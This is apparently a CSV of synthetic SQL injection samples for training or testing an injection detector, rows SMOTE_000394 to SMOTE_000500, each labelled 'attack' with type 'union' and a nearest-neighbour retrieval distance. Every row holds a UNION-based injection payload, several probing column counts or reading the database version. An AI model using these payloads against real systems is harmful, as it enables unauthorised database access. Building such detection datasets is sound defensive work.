id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000394,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000146,1.052705813812209
SMOTE_000395,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.4256227704133379
SMOTE_000396,attack,union,"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",nearest_attack_euclidean,R000301,1.8478913452855807
SMOTE_000397,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000096,0.4182877787778996
SMOTE_000398,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,0.4566524488662185
SMOTE_000399,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000128,0.9159065014490461
SMOTE_000400,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000041,0.1218608001895043
SMOTE_000401,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R000287,0.45426254670617977
SMOTE_000402,attack,union,"-9774'   )    )     )   union all select 6954,6954,6954#",nearest_attack_euclidean,R000144,0.5159358447639076
SMOTE_000403,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000101,0.22558311856738908
SMOTE_000404,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000096,0.4564501466454203
SMOTE_000405,attack,union,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",nearest_attack_euclidean,R000083,2.920745904626793
SMOTE_000406,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,0.7184849860693542
SMOTE_000407,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000202,0.4082608504490217
SMOTE_000408,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000267,0.5991161485266809
SMOTE_000409,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000060,0.06834574091775003
SMOTE_000410,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000052,0.07711301813485265
SMOTE_000411,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000003,0.16019582579395314
SMOTE_000412,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R000235,0.02378232293220345
SMOTE_000413,attack,union," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000045,0.1758104794796796
SMOTE_000414,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,0.07165130174413073
SMOTE_000415,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000109,0.28404757906783035
SMOTE_000416,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000236,0.0494188223558961
SMOTE_000417,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000236,0.7845104811276628
SMOTE_000418,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.3387310768244596
SMOTE_000419,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000091,0.22738722928842192
SMOTE_000420,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,1.266516960899385
SMOTE_000421,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,0.8836914440902502
SMOTE_000422,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000197,0.07228384852252999
SMOTE_000423,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000090,0.4846223110651567
SMOTE_000424,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000307,0.7125412206449128
SMOTE_000425,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,0.5432888736406618
SMOTE_000426,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,0.19185389706625422
SMOTE_000427,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000270,0.8930232930083012
SMOTE_000428,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000041,0.4956036841694874
SMOTE_000429,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.14062862391801206
SMOTE_000430,attack,union,"1 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000066,0.10877484218632966
SMOTE_000431,attack,union,"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",nearest_attack_euclidean,R000284,1.1531925759649573
SMOTE_000432,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000233,0.8215174416876195
SMOTE_000433,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,0.04496106751113895
SMOTE_000434,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.7081637277466156
SMOTE_000435,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000171,0.6060634629123949
SMOTE_000436,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000090,0.6213758142945928
SMOTE_000437,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000058,0.19737421706200448
SMOTE_000438,attack,union,"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",nearest_attack_euclidean,R000253,0.002917483651392164
SMOTE_000439,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000026,0.3823505492374194
SMOTE_000440,attack,union," select * from users where id  =  1 union select @ _,version  (    )   -- 1",nearest_attack_euclidean,R000031,0.002989982552862773
SMOTE_000441,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000103,1.2299861837301431
SMOTE_000442,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,0.11533813910095381
SMOTE_000443,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000305,0.4248643318083314
SMOTE_000444,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000060,0.20107934934051444
SMOTE_000445,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000185,0.8929372446244643
SMOTE_000446,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000136,0.49112755549569426
SMOTE_000447,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000011,6.824677956705212
SMOTE_000448,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.2162575492198101
SMOTE_000449,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000297,1.096960209099479
SMOTE_000450,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.04644579263499938
SMOTE_000451,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.11556422852002504
SMOTE_000452,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,1.2212991737106098
SMOTE_000453,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.3704189615242405
SMOTE_000454,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000050,0.024161372819418367
SMOTE_000455,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000267,0.2674902253981316
SMOTE_000456,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,1.1140178216937886
SMOTE_000457,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000063,0.3667336169380187
SMOTE_000458,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000270,0.9743118734490126
SMOTE_000459,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000291,0.5242600520930132
SMOTE_000460,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000092,0.02047706184553681
SMOTE_000461,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000232,0.943371274739414
SMOTE_000462,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000011,0.07172763311666507
SMOTE_000463,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000181,0.03908132864235622
SMOTE_000464,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,1.096145617431873
SMOTE_000465,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000032,2.204647533983082
SMOTE_000466,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.32396516697147454
SMOTE_000467,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000172,1.0868038206304025
SMOTE_000468,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000123,0.822402859903876
SMOTE_000469,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000130,0.05429814506318285
SMOTE_000470,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000198,0.26529241050088204
SMOTE_000471,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.45518669415364027
SMOTE_000472,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.9284920810949402
SMOTE_000473,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000096,0.3881311272704147
SMOTE_000474,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000084,0.3876100401981808
SMOTE_000475,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000130,0.6639107538717096
SMOTE_000476,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000158,8.429369702178807e-08
SMOTE_000477,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,1.2132638922825785
SMOTE_000478,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000123,0.7849099954012269
SMOTE_000479,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000117,0.4266113997262873
SMOTE_000480,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000310,0.48116532879899737
SMOTE_000481,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,4.165035873229564
SMOTE_000482,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,3.296945138233456e-05
SMOTE_000483,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.6224861902715899
SMOTE_000484,attack,union,"1%"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000292,0.8025274566140131
SMOTE_000485,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.37104937797098936
SMOTE_000486,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,1.3552056825061782
SMOTE_000487,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000034,0.3087587862557721
SMOTE_000488,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000143,0.8802300502187268
SMOTE_000489,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.07121378778441469
SMOTE_000490,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000191,0.62545103877539
SMOTE_000491,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000074,0.35779973916356084
SMOTE_000492,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,0.2984759321448207
SMOTE_000493,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.2216264102737117
SMOTE_000494,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000099,0.37704895595798166
SMOTE_000495,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.33677676679596674
SMOTE_000496,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,0.8292598429376674
SMOTE_000497,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,0.2477996748725954
SMOTE_000498,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000231,0.552672930254821
SMOTE_000499,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000281,0.19822068992928552
SMOTE_000500,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000226,0.0982776792926306
